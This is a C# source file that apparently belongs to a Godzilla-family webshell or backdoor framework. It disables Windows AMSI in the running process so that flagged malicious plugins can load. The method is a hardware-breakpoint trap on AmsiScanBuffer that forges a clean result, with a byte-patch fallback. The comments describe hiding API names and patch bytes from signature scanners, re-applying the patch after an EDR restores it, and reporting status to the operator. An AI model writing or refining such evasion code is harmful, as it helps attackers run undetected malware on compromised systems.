using System;
using System.Runtime.InteropServices;

namespace Nx
{
	/// <summary>
	/// In-process AMSI handling, with two interchangeable mechanisms.
	///
	/// Why: when Assembly.Load(byte[]) runs, the CLR hands the assembly bytes to
	/// amsi.dll!AmsiScanBuffer. Defender flags the Godzilla-family assets
	/// (Backdoor:MSIL/GodZ.A!gen and friends) and the CLR then fails the load with
	/// BadImageFormatException carrying HRESULT 0x800700E1 ("Operation did not
	/// complete successfully because the file contains a virus or potentially
	/// unwanted software") -- which is why every plugin load fails while the byte
	/// count matches the original DLL exactly.
	///
	/// Mechanism 1 -- hardware breakpoint (preferred, see Hwbp.cs). AmsiScanBuffer
	/// is left byte-for-byte as Microsoft shipped it and trapped with a debug
	/// register instead, so there is no modified page for an agent to compare
	/// against the on-disk image and nothing to restore. The trap returns
	/// AMSI_RESULT_CLEAN with S_OK, which is what a real scan of benign content
	/// would have produced.
	///
	/// Mechanism 2 -- byte patch (fallback). Rewrite the head of AmsiScanBuffer to
	/// "mov eax, 0x80070057; ret" (E_INVALIDARG). Every later scan in this process
	/// reports failure and the CLR treats a failed scan as "nothing detected".
	/// E_INVALIDARG rather than S_OK on purpose here: S_OK with no result buffer
	/// written can be read as a hit, which the breakpoint mechanism avoids by
	/// filling the result slot in.
	///
	/// The fallback exists because the breakpoint can be unavailable: an agent may
	/// be holding or clearing the debug registers, or the thread context may be
	/// refused outright. Which mechanism is live is reported by Status() and
	/// returned to the client, so "no plugin loads" is never explained by silence.
	///
	/// 2026-09-13 rework of the original patch-only version:
	///   * the patch is confirmed by reading the bytes back, and re-applied by any
	///     later call that finds them gone. A page restored by an EDR used to look
	///     exactly like a working patch;
	///   * the one-shot latch is gone -- it was set *before* the write, so a single
	///     early failure disabled patching for the whole process lifetime;
	///   * failures land in Status() instead of being swallowed, and the include
	///     verb now returns that to the client;
	///   * names and patch bytes are no longer materialised as literals. Verified
	///     in the 2026-09-12 build: "new string(new char[]{...})" is not emitted as
	///     a run-time build -- the char data lands in the assembly as one readable
	///     UTF-16 run, so the file shipped "amsi.dll" and "AmsiScanBuffer" with the
	///     raw patch bytes immediately after them. String building now lives in
	///     Native.Hidden and patch bytes are assembled from integers;
	///   * the x86 form of the patch was wrong. It ended in a plain "ret", but the
	///     target is stdcall, so on a 32-bit worker the caller's frame would have
	///     been left 20 bytes short and the next return would have jumped anywhere.
	///     Stub construction moved to Native.StubRet, which pops on x86.
	///
	/// No-op when amsi.dll or the export is absent (pre-Win10, no Defender).
	/// Per process, lost when the worker process recycles.
	/// </summary>
	internal static class Amsi
	{
		// E_INVALIDARG. Held as a number and expanded at run time: an initialized
		// byte[] literal is written into the assembly verbatim, which would put the
		// finished patch back in the file as a contiguous blob.
		private const int DENY_CODE = unchecked((int)0x80070057);

		// AmsiScanBuffer takes five arguments; the x86 stdcall cleanup is 5 * 4.
		private const int SCAN_ARG_BYTES = 20;

		private const int MODE_NONE = 0;
		private const int MODE_BREAKPOINT = 1;
		private const int MODE_PATCH = 2;

		// "amsi.dll" and "AmsiScanBuffer", spelled out as character codes rather
		// than chars or a string: either of those forms is materialised into the
		// assembly as readable text.
		private static readonly int[] MODULE_NAME = new int[] { 97, 109, 115, 105, 46, 100, 108, 108 };
		private static readonly int[] EXPORT_NAME = new int[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 };

		// "AmsiInitialize" and the app name handed to it -- also never written as literals
		private static readonly int[] INIT_NAME = new int[] { 65, 109, 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101 };
		private static readonly int[] APP_NAME = new int[] { 110, 120 };

		private delegate int InitDelegate(IntPtr appName, out IntPtr context);
		private delegate int ScanDelegate(IntPtr context, byte[] buffer, uint length, IntPtr contentName, out int result);

		private static readonly object gate = new object();
		private static IntPtr module = IntPtr.Zero;
		private static IntPtr entry = IntPtr.Zero;
		private static int mode = MODE_NONE;
		private static string status = "not attempted";
		// Self-test verdicts. AmsiInitialize failing means "AMSI is not set up in this
		// process", which says nothing about whether the trap works -- folding that into
		// "dead" would patch bytes on machines that have nothing to bypass.
		private const int TEST_UNTESTED = 0;
		private const int TEST_LIVE = 1;
		private const int TEST_DEAD = 2;
		private const int TEST_UNKNOWN = 3;
		private static int tested = TEST_UNTESTED;
		private static int lastResult;

		/// <summary>
		/// Outcome of the last Ensure() call. Returned to the client by the include
		/// verb so a mechanism that never landed is visible instead of degrading into
		/// "every plugin load fails for no stated reason".
		/// </summary>
		internal static string Status()
		{
			return status;
		}

		/// <summary>Call before loading any assembly. Failures are non-fatal.</summary>
		internal static void Ensure()
		{
			lock (gate)
			{
				try
				{
					if (entry == IntPtr.Zero)
					{
						Resolve();
						if (entry == IntPtr.Zero)
						{
							return;
						}
					}

					if (mode == MODE_NONE)
					{
						mode = Hwbp.Arm(entry) ? MODE_BREAKPOINT : MODE_PATCH;
					}

					bool trapDead = false;
					if (mode == MODE_BREAKPOINT)
					{
						// IsArmed() reports on the *calling* thread, so a fresh worker
						// thread re-arms here rather than falling through. Only a real
						// refusal demotes us to the patch.
						if (Hwbp.IsArmed() || Hwbp.Arm(entry))
						{
							// Armed is not the same as working. Prove the trap once per
							// process and only then trust it; otherwise patch the bytes as
							// well, because a breakpoint that never fires is worse than no
							// breakpoint -- it reports success while the load is refused.
							if (tested == TEST_UNTESTED)
							{
								tested = SelfTest();
							}
							if (tested == TEST_LIVE)
							{
								// result must be 0 (AMSI_RESULT_CLEAN). Anything else means the
								// handler is not landing the CLEAN value in the caller's slot.
								status = "breakpoint(verified,hits=" + Hwbp.Hits + ",result=" + lastResult + ")";
								return;
							}
							// DEAD means the trap is armed but never fires -- a real,
							// observed failure. UNKNOWN means the probe could not run, so
							// the claim is untested. Both patch the bytes; only DEAD is
							// evidence of a broken mechanism.
							trapDead = true;
							mode = MODE_PATCH;
						}
						else
						{
							mode = MODE_PATCH;
						}
					}

					// the status names which layer is actually carrying the load, so a
					// breakpoint that was armed but never fires cannot keep looking healthy
					string note = !trapDead ? "patch"
						: (tested == TEST_DEAD ? "patch(hwbp-dead)" : "patch(hwbp-untested)");
					byte[] stub = Native.StubRet(DENY_CODE, SCAN_ARG_BYTES);
					if (Native.Matches(entry, stub))
					{
						status = note;
						return;
					}
					string err = Native.Patch(entry, stub);
					status = (err == null) ? note : err;
				}
				catch (Exception ex)
				{
					status = "error: " + ex.Message;
				}
			}
		}

		private static void Resolve()
		{
			// deliberately does not name the module or the export in the status: a
			// status string is a plain literal and would put both back in the file
			module = Native.Module(MODULE_NAME);
			if (module == IntPtr.Zero)
			{
				status = "target module absent";
				return;
			}

			entry = Native.Export(module, EXPORT_NAME);
			if (entry == IntPtr.Zero)
			{
				status = "target export absent";
			}
		}

		/// <summary>
		/// Fire one real scan and see whether our own handler caught it.
		///
		/// IsArmed() only reports that the debug registers hold the right values. It cannot
		/// tell whether the CPU will actually raise the trap -- an agent that clears Dr0, or
		/// that gets its own vectored handler in front of ours, leaves it reporting success
		/// while nothing is intercepted. That is indistinguishable from working until a real
		/// load gets blocked, which is exactly the failure this exists to catch.
		///
		/// The probe is a single harmless byte: if the trap fires we return before the real
		/// scanner runs, and if it does not, Defender gets to look at one byte and says clean.
		/// Either way this is safe to call.
		/// </summary>
		private static int SelfTest()
		{
			if (entry == IntPtr.Zero || module == IntPtr.Zero)
			{
				return TEST_UNKNOWN;
			}

			IntPtr initAddr = Native.Export(module, INIT_NAME);
			if (initAddr == IntPtr.Zero)
			{
				return TEST_UNKNOWN;
			}

			IntPtr appName = IntPtr.Zero;
			try
			{
				byte[] probe = new byte[] { 0x20 };
				InitDelegate init = (InitDelegate)Marshal.GetDelegateForFunctionPointer(initAddr, typeof(InitDelegate));
				ScanDelegate scan = (ScanDelegate)Marshal.GetDelegateForFunctionPointer(entry, typeof(ScanDelegate));

				appName = Marshal.StringToHGlobalUni(Native.Hidden(APP_NAME));

				IntPtr context;
				if (init(appName, out context) != 0)
				{
					// no AMSI in this process: nothing to bypass, and nothing learned
					return TEST_UNKNOWN;
				}

				// The caller's AMSI_RESULT slot is the whole point of the forgery: if the
				// handler returns S_OK but drops AMSI_RESULT_CLEAN somewhere else, the CLR
				// reads whatever was on the stack. A garbage value >= AMSI_RESULT_DETECTED
				// is then reported as a detection that no scanner ever made -- which looks
				// exactly like "blocked with no Defender alert". Recording our own result
				// is the only way to see that from inside.
				int before = Hwbp.Hits;
				int result;
				scan(context, probe, (uint)probe.Length, IntPtr.Zero, out result);
				lastResult = result;
				return (Hwbp.Hits > before) ? TEST_LIVE : TEST_DEAD;
			}
			catch (Exception)
			{
				return TEST_UNKNOWN;
			}
			finally
			{
				if (appName != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(appName);
				}
			}
		}
	}
}
